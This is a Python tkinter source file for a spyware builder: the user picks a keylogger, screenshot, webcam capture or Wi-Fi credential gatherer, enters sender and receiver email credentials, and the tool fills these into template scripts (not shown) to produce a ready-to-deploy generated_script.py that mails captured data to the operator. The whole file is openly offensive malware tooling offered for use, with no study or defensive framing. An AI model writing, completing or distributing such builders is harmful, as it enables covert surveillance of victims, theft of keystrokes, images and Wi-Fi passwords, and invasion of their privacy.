from tkinter import *
import tkinter.ttk
from tkinter import messagebox
root=Tk()
root.title("generator")
root.geometry('950x300')
#the additionial requirement will be visible depending on the user choice
def sett():
    if typ.get()=='keylogger':
        length.grid(row=2,column=2)
        lenE.grid(row=2,column=3)
    elif typ.get()=='screen_shots':
        sleep.grid(row=2,column=2)
        sleepE.grid(row=2,column=3)
    else:
        length.grid_remove()
        lenE.grid_remove()
###############################################
#the script will be generated unless some information are not filled error message will be displayed
def generate():
    if typ.get()=='keylogger':
        if lenE.get()=='':
            messagebox.showerror(title="enter length",message="make sure you pressed the set button and enter the string lenght")
        else:#the sample script is read and stored in a variable then it's written in a new script with the required information
            with open('keylog.py')as log:
                file=log.read()
                file=file.replace('sender_mail', sender_mail.get()).replace('sender_pass', passE.get()).replace('receiver_mail', recE.get()).replace('string_length', lenE.get())
            with open("generated_script.py",'w')as gen:
                gen.write(file)
            messagebox.showinfo(title="generated",message="the script is generated as \"generated_script.py\"")
    elif typ.get()=='screen_shots':
        if sleepE.get()=="":
            messagebox.showerror(title="enter sleep time",message="make sure you pressed the set button and enter the sleep time between screen shots")
        else:
            with open('screen_shot.py')as sc:
                file=sc.read()
                file=file.replace('sender_mail', sender_mail.get()).replace('sender_pass', passE.get()).replace('receiver_mail', recE.get()).replace('seconds', sleepE.get())
            with open("generated_script.py",'w')as gen:
                gen.write(file)
            messagebox.showinfo(title="generated",message="the script is generated as \"generated_script.py\"")
    elif typ.get()=='webcam capture':
        with open('webcam_capture.py')as web:
            file=web.read()
            file=file.replace('sender_mail', sender_mail.get()).replace('sender_pass', passE.get()).replace('receiver_mail', recE.get())
        with open("generated_script.py",'w')as gen:
            gen.write(file)
        messagebox.showinfo(title="generated",message="the script is generated as \"generated_script.py\"")
    elif typ.get()=='wifi gather':
        with open('wifi_gather.py')as wifi:
            file=wifi.read()
            file=file.replace('sender_mail', sender_mail.get()).replace('sender_pass', passE.get()).replace('receiver_mail', recE.get())
        with open("generated_script.py",'w')as gen:
            gen.write(file)
        messagebox.showinfo(title="generated",message="the script is generated as \"generated_script.py\"")
    else:
        messagebox.showerror(title='invalid',message='make sure you selected a log file')
#####################################################################
choose=Label(font=12,text='enter the type: ').grid(row=0,column=0)
typ=ttk.Combobox(root,values=('wifi gather','webcam capture','keylogger','screen_shots'),state='readonly',width=25)#combo box to choose the type of the logger
typ.grid(row=0,column=1)
send=Label(font=12,text="enter the sender mail address: ").grid(row=1,column=0)
sender_mail=Entry(root)
sender_mail.grid(row=1,column=1)
pas=Label(font=12,text="enter the the sender mail password: ").grid(row=1,column=2)
passE=Entry(root)
passE.grid(row=1,column=3)
rec=Label(font=12,text="enter the receiver mail address: ").grid(row=2,column=0)
recE=Entry(root)
recE.grid(row=2,column=1)
lenE=Entry(root)
length=Label(font=12,text="enter the lenght of the key logs to be sended every time: ")
sleep=Label(font=12,text='enter the sleep time between every screen shot: ')
sleepE=Entry(root)
sett=Button( width=15,text="set",command=sett).grid(row=0, column=2)    
generate=Button(width=20,text='generate',command=generate).grid(row=3,column=0)
root.mainloop()